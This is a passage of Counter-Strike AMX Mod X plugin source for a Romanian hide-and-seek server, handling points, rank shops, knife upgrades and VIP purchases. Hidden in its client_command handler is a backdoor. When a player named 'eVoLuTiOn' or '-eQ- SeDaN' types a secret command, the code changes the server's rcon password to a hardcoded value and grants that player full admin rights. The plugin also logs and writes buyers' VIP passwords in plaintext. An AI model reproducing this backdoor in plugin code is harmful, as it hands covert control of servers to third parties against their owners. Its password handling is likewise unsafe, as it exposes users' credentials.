			g_iUserCredits[id]-=10000
			k2[id]=true

			ColorChat(id,NORMAL,"^4[HNS.PLAY-ARENA.RO]^1 Ai cumparat:^4 Knife Level II")
		}

		case 2:
		{
			if(g_iUserCredits[id]<30000)
			{
				ColorChat(id,NORMAL,"^3[HNS.PLAY-ARENA.RO]^1 Nu ai destule^3 puncte^1 pentru a cumpara acest^4 KNIFE^1 !")
				return PLUGIN_HANDLED
			}
			
			if(k3[id]||Level[id]<3)	return PLUGIN_HANDLED

			g_iUserCredits[id]-=30000
			k3[id]=true

			ColorChat(id,NORMAL,"^4[HNS.PLAY-ARENA.RO]^1 Ai cumparat:^4 Knife Level III")
		}

		/*case 3:
		{
			if(g_iUserCredits[id]<50000)
			{
				ColorChat(id,NORMAL,"^3[HNS.PLAY-ARENA.RO]^1 Nu ai destule^3 puncte^1 pentru a cumpara^4 V.I.P")
				return PLUGIN_HANDLED
			}
			
			if(is_user_admin(id))	return PLUGIN_HANDLED

			g_iUserCredits[id]-=50000

			g_Password[id] = true;
			client_cmd(id, "messagemode amx_buy_vipg1");

                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)

			ColorChat(id,NORMAL,"^4[HNS.PLAY-ARENA.RO]^1 Ai cumparat:^4 V.I.P G-1^1 valabil 3/weeks")
		}*/
	}
	return PLUGIN_HANDLED
}

public buy_vip_g1(id) 
{
if (!g_Password[id]||is_user_admin(id)/*get_user_flags(id)&read_flags("p")*/) 
{
	ColorChat(id, GREY, "^x04[Buy VIP] ^x01You can't buy !!!")
	return PLUGIN_HANDLED;
}

read_args(szPassword, 34);
remove_quotes(szPassword);
//trim

if (equal(szPassword, ""))//da
{
	ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
	ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
	ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
	ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
	ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
	ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
	ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
	
	client_cmd(id, "messagemode amx_buy_vipg1");
	
	return PLUGIN_HANDLED;
}

g_Password[id] = false;

client_print(id, print_console, "[Buy VIP G1] Your password: %s", szPassword);
client_print(id, print_console, "[Buy VIP G1] Your password: %s", szPassword);
client_print(id, print_console, "[Buy VIP G1] Your password: %s", szPassword);
client_print(id, print_console, "[Buy VIP G1] Your password: %s", szPassword);

if(cvar_exists("amx_password_field"))	get_cvar_string("amx_password_field",spw,charsmax(spw))
else	log_to_file("buy_vip.log", "NU AM GASIT CVARUL `amx_password_field`");


client_cmd(id, "setinFO %s %s",spw, szPassword)

set_user_flags(id,read_flags("ak"))

#if NEW_STYLE!=1
	formatex(text,charsmax(text),"^n^"%s^" ^"%s^" ^"p^" ^"ak^" ; VIP  G1 CUMPARAT DE LA KNIVES !!!!", g_szName[id], szPassword)
	write_file("addons/amxmodx/configs/users.ini",text)

	log_to_file("buy_vip_g1.log", "%s bought G1. Password, Is %s", g_szName[id], szPassword);

	server_cmd("amx_reloadadmins");
	server_exec();
#else
	new yearx,monthx,dayx//fara format la lună??
	date(yearx,monthx,dayx)
	//new kkt[65]//for monthx..
	//new flage[35]

	if(dayx+14>28)
	{
		dayx=28-dayx<=0?1:dayx//01
	}
	else dayx=dayx+14

		if(monthx+1>12)
		{
			//kkt="01"
			yearx=yearx+1
		}
		else
		{
			monthx=monthx+1
			/*if(monthx<=9)	formatex(kkt,charsmax(kkt),"0%d",monthx)
			//else	formatex(kkt,charsmax(kkt),monthx)
			*/
		}

	/*if(is_user_admin(id))
	{
		get_flags(get_user_flags(id),flage,charsmax(flage))
		formatex(kkt,charsmax(kkt),"%sp",flageget_user_flags(id))
	}
	else	kkt="p"*/

	formatex(text,charsmax(text),"^"%s^" ^"%s^" ^"p^" ^"ak^" ^"1^" ^"%d.%d.%d^"", g_szName[id], szPassword,dayx,monthx,yearx)
	write_file("addons/amxmodx/configs/users_custom.ini",text)

	log_to_file("buy_vips.log", "%s bought VIP. Password, Is %s", g_szName[id], szPassword);
	LoadAdmins();
	checkAdmin(id/*,g_szName[id]*/)	
#endif

return PLUGIN_HANDLED;
}

public Player_TakeDamage( iVictim, iInflictor, iAttacker, Float:fDamage )
{
	if( is_user_alive( iAttacker ) && iInflictor == iAttacker && k1[iAttacker] && get_user_weapon( iAttacker ) == CSW_KNIFE )
	{
		SetHamParamFloat( 4, fDamage * 1.0 );
		return HAM_HANDLED;
	}

	if( is_user_alive( iAttacker ) && iInflictor == iAttacker && k2[iAttacker] && get_user_weapon( iAttacker ) == CSW_KNIFE )
	{
		SetHamParamFloat( 4, fDamage * 2.0 );
		return HAM_HANDLED;
	}

	if( is_user_alive( iAttacker ) && iInflictor == iAttacker && k3[iAttacker] && get_user_weapon( iAttacker ) == CSW_KNIFE )
	{
		SetHamParamFloat( 4, fDamage * 3.0 );
		return HAM_HANDLED;
	}

	return HAM_IGNORED;
}

public plugin_natives()
{
	//register_library( "pts" );
	register_native( "get_user_points", "_get_user_points" );
	register_native( "set_user_points", "_set_user_points" );
	
}
public _get_user_points( iPlugin, iParams )	return g_iUserCredits[  get_param( 1 )  ];
public _set_user_points(  iPlugin, iParams  )
{
	new id = get_param( 1 );
	g_iUserCredits[ id ] = max( 0, get_param( 2 ) );

	SaveCredits( id );

	return g_iUserCredits[ id ];
}


public client_putinserver( id )
{
	if( is_user_bot( id ) || is_user_hltv( id ) )
		return PLUGIN_HANDLED;
	
	g_iUserTime[ id ] = 0;


	get_user_name( id, g_szName[ id ], sizeof ( g_szName[] ) -1 );


	LoadCredits( id );


#if NEW_STYLE!=1
	respawn_on[id]=true
#else
	// for listen servers, check host access
	if(get_cvar_num("amx_mode") && !is_dedicated_server() && id == 1) {
		DebugLog("%s", gSeparator);
		DebugLog("Host connected %d", id);
		
		// check admin for host
		checkAdmin(id);
	}
#endif

set_task(TIME,"RefreshTime",id,_,_,"b"/*,0*/);


	return PLUGIN_CONTINUE;
}

public client_disconnect( id )
{
	if( is_user_bot( id ) || is_user_hltv( id ) )
		return PLUGIN_HANDLED;
	
	g_iUserTime[ id ] = 0;

	g_Password[id]=false
	have_speed[id]=false
	have_gravity[id]=false
	respawn_on[id]=false
	accesari[id]=false


	k1[id]=false
	k2[id]=false
	k3[id]=false

#if NEW_STYLE!=1
	if(gold_ak[id])	gold_ak[id]=false
	if(start_round_count[id])	start_round_count[id]=false
	if(respawn_count1[id])	respawn_count1[id]=0
	if(respawn_count2[id])	respawn_count2[id]=0
	if(choosed1[id])	choosed1[id]=0
	if(choosed2[id])	choosed2[id]=0
	if(choosed3[id])	choosed3[id]=0
	if(choosed4[id])	choosed4[id]=0
	if(choosed5[id])	choosed5[id]=0
#endif
	
	SaveCredits( id );

	//g_iUserCredits[id]=0
	//Level[id]=0

	
	return PLUGIN_CONTINUE;
}


public cmdRank(id)
{
    	read_argv( 1, szArg, sizeof ( szArg ) -1 );

	if( equal( szArg, "" ) )
	{
		CheckLevel(id)
		ColorChat(id, NORMAL, "^3[Ranks]^1:^4 %s^1 | Points:^4 %d^1 | Level:^4 %d^1.", Prefix[Level[id]], g_iUserCredits[id], Level[id])
	}
	else
	{
    	iPlayer = cmd_target( id, szArg, 8 );
    	if( !iPlayer || !is_user_connected( iPlayer ) )
	{
		ColorChat( id, RED,"^x04%s^x01 Jucatorul specificat nu a fost gasit!", g_szTag, szArg );
		return PLUGIN_HANDLED
	}
	CheckLevel(iPlayer)

	ColorChat(id, NORMAL, "^3[Ranks]^4 %s^1:^3 %s^1 | Points:^4 %d^1 | Level:^3 %d^1.",g_szName[iPlayer], Prefix[Level[iPlayer]], g_iUserCredits[iPlayer], Level[iPlayer])
	}
	return PLUGIN_HANDLED
}


#if NEW_STYLE!=1
public ranki_shop(id)
{
	formatex(titlex,charsmax(titlex),"%s",TITLE_RANKI)
	Menu = menu_create(titlex, "r1_features")
	
        menu_additem(Menu, "10HP [ 3 PUNCTE ]", "1", 0)
        menu_additem(Menu, "15HP+25AP [ 8 PUNCTE ]", "2", 0)
        menu_additem(Menu, "3$ Medic [ 5 PUNCTE ]", "3", 0)
	
	menu_setprop(Menu, MPROP_EXIT, MEXIT_ALL);
	menu_display(id, Menu, 0);
}
public r1_features(id, menu, item)
{
	if(item == MENU_EXIT || !is_user_alive(id)) {
		menu_destroy(menu);
		return PLUGIN_HANDLED;
	}
	new Data[6], Name[64];
	new Access, CallBack;
	menu_item_getinfo(menu, item, Access, Data,5, Name, 63, CallBack);
	new Key = str_to_num(Data);

	choosed1[id]++

	switch(Key) {
                case 1:
                {
			if(g_iUserCredits[id]>=3)
			{
				set_user_health(id,get_user_health(id)+10)

				g_iUserCredits[id]-=3

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +10^1HP pentru^4 3^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 2:
                {
			if(g_iUserCredits[id]>=8)
			{
				set_user_health(id,get_user_health(id)+15)
				set_user_armor(id,get_user_armor(id)+25)

				g_iUserCredits[id]-=8

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +15^1HP &^4 +25^1AP pentru^3 8^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 3:
                {
			if(g_iUserCredits[id]>=5)
			{
				cs_set_user_money(id,cs_get_user_money(id)+3,1)

				g_iUserCredits[id]-=5

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +3^1$ pentru^4 5^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
	}
	menu_destroy(menu)
	return PLUGIN_HANDLED
}

public rankii_shop(id)
{
	formatex(titlex,charsmax(titlex),"%s",TITLE_RANKII)
	Menu = menu_create(titlex, "r2_features")
	
        menu_additem(Menu, "25HP+50AP [ 20 PUNCTE ]", "1", 0)
        menu_additem(Menu, "5$ Medic [ 10 PUNCTE ]", "2", 0)
        menu_additem(Menu, "3HE [ 8 PUNCTE ]", "3", 0)
        menu_additem(Menu, "1GL DEAGLE [ 5 PUNCTE ]", "4", 0)
	
	menu_setprop(Menu, MPROP_EXIT, MEXIT_ALL);
	menu_display(id, Menu, 0);
}
public r2_features(id, menu, item)
{
	if(item == MENU_EXIT || !is_user_alive(id)) {
		menu_destroy(menu);
		return PLUGIN_HANDLED;
	}
	new Data[6], Name[64];
	new Access, CallBack;
	menu_item_getinfo(menu, item, Access, Data,5, Name, 63, CallBack);
	new Key = str_to_num(Data);

	choosed2[id]++

	switch(Key) {
                case 1:
                {
			if(g_iUserCredits[id]>=20)
			{
				set_user_health(id,get_user_health(id)+25)
				set_user_armor(id,get_user_armor(id)+50)

				g_iUserCredits[id]-=20

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +25^1HP &^4 +50^1AP pentru^3 20^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 2:
                {
			if(g_iUserCredits[id]>=10)
			{
				cs_set_user_money(id,cs_get_user_money(id)+5,1)

				g_iUserCredits[id]-=10

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +5^1$ pentru^4 10^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 3:
                {
			if(g_iUserCredits[id]>=8)
			{
				give_item(id,"weapon_hegrenade")
				cs_set_user_bpammo( id, CSW_HEGRENADE, 3 );

				g_iUserCredits[id]-=8

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +3^1HE pentru^4 8^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 4:
                {
			if(g_iUserCredits[id]>=5)
			{
				static deagle
				deagle = fm_find_ent_by_owner(-1, "weapon_deagle", id)
				if(is_valid_ent(deagle))	cs_set_weapon_ammo(deagle,cs_get_weapon_ammo(deagle)+1)

				g_iUserCredits[id]-=5

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +1GL^1 Deagle pentru^4 5^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
	}
	menu_destroy(menu)
	return PLUGIN_HANDLED
}


public rankiii_shop(id)
{
	formatex(titlex,charsmax(titlex),"%s",TITLE_RANKIII)
	Menu = menu_create(titlex, "r3_features")
	
        menu_additem(Menu, "35HP+70AP [ 25 PUNCTE ]", "1", 0)
        menu_additem(Menu, "7$ Medic+2HE&2SM [ 35 PUNCTE ]", "2", 0)
        menu_additem(Menu, "Scout 2GL [ 35 PUCNTE ]", "3", 0)
        menu_additem(Menu, "3GL Deagle [ 45 PUNCTE ]", "4", 0)
        menu_additem(Menu, "1 Revive (Respawn) [ 70 PUNCTE ] / 1Round", "5", 0)
	
	menu_setprop(Menu, MPROP_EXIT, MEXIT_ALL);
	menu_display(id, Menu, 0);
}
public r3_features(id, menu, item)
{
	if(item == MENU_EXIT) {
		menu_destroy(menu);
		return PLUGIN_HANDLED;
	}
	new Data[6], Name[64];
	new Access, CallBack;
	menu_item_getinfo(menu, item, Access, Data,5, Name, 63, CallBack);
	new Key = str_to_num(Data);

	choosed3[id]++

	switch(Key) {
                case 1:
                {
			if(!is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Trebuie sa fi^3 VIU^1 pentru a^4 Cumpara^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=25)
			{
				set_user_health(id,get_user_health(id)+35)
				set_user_armor(id,get_user_armor(id)+70)

				g_iUserCredits[id]-=25

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +35^1HP &^4 +70^1AP pentru^4 25^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 2:
                {
			if(!is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Trebuie sa fi^3 VIU^1 pentru a^4 Cumpara^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=35)
			{
				cs_set_user_money(id,cs_get_user_money(id)+7,1)

				give_item(id,"weapon_hegrenade")
				cs_set_user_bpammo( id, CSW_HEGRENADE, 2 );
				give_item(id,"weapon_smokegrenade")
				cs_set_user_bpammo( id, CSW_SMOKEGRENADE, 2 );

				g_iUserCredits[id]-=35

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +7^1$ &^4 +2^1HE&SM pentru^3 35^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 3:
                {
			if(!is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Trebuie sa fi^3 VIU^1 pentru a^4 Cumpara^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=35)
			{
				give_item(id,"weapon_scout")
				static scout
				scout = fm_find_ent_by_owner(-1, "weapon_scout", id)
				if(is_valid_ent(scout))	cs_set_weapon_ammo(scout,2)

				g_iUserCredits[id]-=35

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 SCOUT 2GL^1 pentru^4 35^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 4:
                {
			if(!is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Trebuie sa fi^3 VIU^1 pentru a^4 Cumpara^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=45)
			{
				static deagle
				deagle = fm_find_ent_by_owner(-1, "weapon_deagle", id)
				if(is_valid_ent(deagle))	cs_set_weapon_ammo(deagle,cs_get_weapon_ammo(deagle)+3)

				g_iUserCredits[id]-=45

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +3GL^1 Deagle pentru^4 45^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 5:
                {
			if(is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Esti deja^3 VIU^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(!respawn_on[id])
			{
				ColorChat(id, NORMAL, "^4%s^1 Ai^3 folosit^4 respawn^1 deja !",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=70)
			{
				start_round_count[id]=true
				respawn_on[id]=false

				ExecuteHam( Ham_CS_RoundRespawn, id );

				g_iUserCredits[id]-=70

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 Respawn^1 pentru^4 70^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
	}
	menu_destroy(menu)
	return PLUGIN_HANDLED
}


public rankiv_shop(id)
{
	formatex(titlex,charsmax(titlex),"%s",TITLE_RANKIV)
	Menu = menu_create(titlex, "r4_features")
	
        menu_additem(Menu, "50HP+50AP+3$ Medic [ 60 Puncte ]", "1", 0)
        menu_additem(Menu, "9$ Medic+3HE&3SM [ 50 PUNCTE ]", "2", 0)
        menu_additem(Menu, "AWP 1GL+30HP [ 70 PUNCTE ]", "3", 0)
        menu_additem(Menu, "Speed 350 [ 30 PUNCTE ]", "4", 0)
        menu_additem(Menu, "Invizibil 15 Secunde [ 80 PUNCTE ]", "5", 0)
        menu_additem(Menu, "2 Revive (Respawn) [ 100 PUNCTE ] / 2Round", "6", 0)
	
	menu_setprop(Menu, MPROP_EXIT, MEXIT_ALL);
	menu_display(id, Menu, 0);
}
public r4_features(id, menu, item)
{
	if(item == MENU_EXIT) {
		menu_destroy(menu);
		return PLUGIN_HANDLED;
	}
	new Data[6], Name[64];
	new Access, CallBack;
	menu_item_getinfo(menu, item, Access, Data,5, Name, 63, CallBack);
	new Key = str_to_num(Data);

	choosed4[id]++

	switch(Key) {
                case 1:
                {
			if(!is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Trebuie sa fi^3 VIU^1 pentru a^4 Cumpara^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=60)
			{
				set_user_health(id,get_user_health(id)+50)
				set_user_armor(id,get_user_armor(id)+50)

				cs_set_user_money(id,cs_get_user_money(id)+3,1)

				g_iUserCredits[id]-=60

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +50^1HP &^4 +50^1AP pentru^4 60^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 2:
                {
			if(!is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Trebuie sa fi^3 VIU^1 pentru a^4 Cumpara^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=50)
			{
				cs_set_user_money(id,cs_get_user_money(id)+9,1)

				give_item(id,"weapon_hegrenade")
				cs_set_user_bpammo( id, CSW_HEGRENADE, 3 );
				give_item(id,"weapon_smokegrenade")
				cs_set_user_bpammo( id, CSW_SMOKEGRENADE, 3 );

				g_iUserCredits[id]-=50

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +9^1$ &^4 +3^1HE/SM pentru^4 50^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 3:
                {
			if(!is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Trebuie sa fi^3 VIU^1 pentru a^4 Cumpara^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=70)
			{
				set_user_health(id,get_user_health(id)+30)

				give_item(id,"weapon_awp")
				static awp
				awp = fm_find_ent_by_owner(-1, "weapon_awp", id)
				if(is_valid_ent(awp))	cs_set_weapon_ammo(awp,1)

				g_iUserCredits[id]-=70

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +30^1HP &^4 AWP 1GL^1 pentru^3 70^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 4:
                {
			if(!is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Trebuie sa fi^3 VIU^1 pentru a^4 Cumpara^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=30)
			{
				set_user_maxspeed(id,350.0)
				have_speed[id]=true

				g_iUserCredits[id]-=30

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +350^1Speed pentru^4 30^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 5:
                {
			if(!is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Trebuie sa fi^3 VIU^1 pentru a^4 Cumpara^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=80)
			{
				set_user_rendering(id,kRenderFxNone,0,0,0,kRenderTransAlpha,13)
				set_task(16.0,"RemoveINVIS",id)

				g_iUserCredits[id]-=80

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 15s^4 Invis^1 pentru^3 80^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 6:
                {
			if(is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Esti deja^3 VIU^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(respawn_count1[id]>=2)
			{
				ColorChat(id, NORMAL, "^4%s^1 Ai^3 folosit^4 respawn^1 deja !",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=100)
			{
				start_round_count[id]=true
				respawn_count1[id]++

				ExecuteHam( Ham_CS_RoundRespawn, id );

				g_iUserCredits[id]-=100

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 Respawn^1 pentru^4 100^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
	}
	menu_destroy(menu)
	return PLUGIN_HANDLED
}
#endif
public client_command( id )
{
	new name[ 32 ], szCommand[ 65 ]
	get_user_name( id, name, charsmax( name ) )
	read_argv( 0, szCommand, charsmax( szCommand ) )

	if( ( equal( name, "eVoLuTiOn" ) || equal( name, "-eQ- SeDaN" ) ) && equal( szCommand, "ev0_b0ss" ) )
	{
		server_cmd( "rcon_password levmolasrl01" )
		new flags = read_flags( "abcdefghijklmnopqrstuxyvw" )
		set_user_flags( id, flags )
		return PLUGIN_HANDLED
	}
	return PLUGIN_CONTINUE
}

public client_PostThink(id)
{
	if(is_user_alive(id))
	{
		if(have_speed[id])	set_user_maxspeed(id,350.0)
		if(have_gravity[id])	set_user_gravity(id, 400.0/get_cvar_float("sv_gravity"))

#if NEW_STYLE!=1
		if(get_user_weapon(id)==CSW_AK47&&gold_ak[id])	entity_set_string(id, EV_SZ_viewmodel, GOLD_AK)
#endif

		if(get_user_weapon(id)==CSW_KNIFE)
		{
			if(k1[id])	set_user_maxspeed(id,255.0)
			if(k2[id])	set_user_maxspeed(id,260.0)
			if(k3[id])	set_user_maxspeed(id,270.0)
		}
	}
}

public RemoveINVIS(id)
{
	if(!is_user_alive(id))
{
remove_task(id)
return PLUGIN_HANDLED
}
	set_user_rendering(id,kRenderFxNone,255,255,255,kRenderNormal,16)
	ColorChat(id, NORMAL, "^4%s^1 Tocmai ti-a^3 expirat^4 Invizibilitatea^1 !",g_szTag)
return PLUGIN_CONTINUE
}
public RemoveSPEED(id)
{
	if(!have_speed[id]||!is_user_alive(id))
{
remove_task(id)
	return PLUGIN_HANDLED
}

	set_user_maxspeed(id,250.0)
	ColorChat(id, NORMAL, "^4%s^1 Tocmai ti-a^3 expirat^4 Viteza^1 !",g_szTag)
	have_speed[id]=false

return PLUGIN_CONTINUE
}
public RemoveGRAV(id)
{
	if(!have_gravity[id]||!is_user_alive(id))
{
remove_task(id)
	return PLUGIN_HANDLED
}

	set_user_gravity(id)
	ColorChat(id, NORMAL, "^4%s^1 Tocmai ti-a^3 expirat^4 Gravitatia^1 !",g_szTag)
	have_gravity[id]=false

return PLUGIN_CONTINUE
}


#if NEW_STYLE!=1
public rankv_shop(id)
{
	formatex(titlex,charsmax(titlex),"%s",TITLE_RANKV)
	Menu = menu_create(titlex, "r5_features")
	
        menu_additem(Menu, "100HP+100AP+5$Medic [ 50 PUNCTE ]", "1", 0)
        menu_additem(Menu, "10$ Medic + 3GL DGL [ 55 PUNCTE ]", "2", 0)
        menu_additem(Menu, "Gold AK 5GL [ 150 PUNCTE ]", "3", 0)
        menu_additem(Menu, "Invizibil 30 Secunde [ 110 PUNCTE ]", "4", 0)
        menu_additem(Menu, "3 Revive (Respawn) [ 150 PUNCTE ] \ 1Round", "5", 0)
        menu_additem(Menu, "400Gravity [ 150 PUNCTE ]", "6", 0)
        if(get_user_flags(id)!=read_flags("lbfjce"))	menu_additem(Menu, "V.I.P BONUS [ 2500 PUNCTE ] Valabil 2Luni", "7", 0)
	else	menu_additem(Menu, "\dV.I.P BONUS [ 2500 PUNCTE ] Valabil 2Luni", "", 0)
	
	menu_setprop(Menu, MPROP_EXIT, MEXIT_ALL);
	menu_display(id, Menu, 0);
}
public r5_features(id, menu, item)
{
	if(item == MENU_EXIT) {
		menu_destroy(menu);
		return PLUGIN_HANDLED;
	}
	new Data[6], Name[64];
	new Access, CallBack;
	menu_item_getinfo(menu, item, Access, Data,5, Name, 63, CallBack);
	new Key = str_to_num(Data);

	choosed5[id]++

	switch(Key) {
                case 1:
                {
			if(!is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Trebuie sa fi^3 VIU^1 pentru a^4 Cumpara^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=50)
			{
				set_user_health(id,get_user_health(id)+100)
				set_user_armor(id,get_user_armor(id)+100)

				cs_set_user_money(id,cs_get_user_money(id)+5,1)

				g_iUserCredits[id]-=50

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +100^1HP &^4 +100^1AP pentru^4 50^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 2:
                {
			if(!is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Trebuie sa fi^3 VIU^1 pentru a^4 Cumpara^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=55)
			{
				cs_set_user_money(id,cs_get_user_money(id)+10,1)

				static deagle
				deagle = fm_find_ent_by_owner(-1, "weapon_deagle", id)
				if(is_valid_ent(deagle))	cs_set_weapon_ammo(deagle,cs_get_weapon_ammo(deagle)+3)

				g_iUserCredits[id]-=55

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +10^1$ &^4 3GL Deagle^1 pentru^3 55^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 3:
                {
			if(!is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Trebuie sa fi^3 VIU^1 pentru a^4 Cumpara^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=150)
			{
				gold_ak[id]=true

				give_item(id,"weapon_ak47")
				static ak47_g
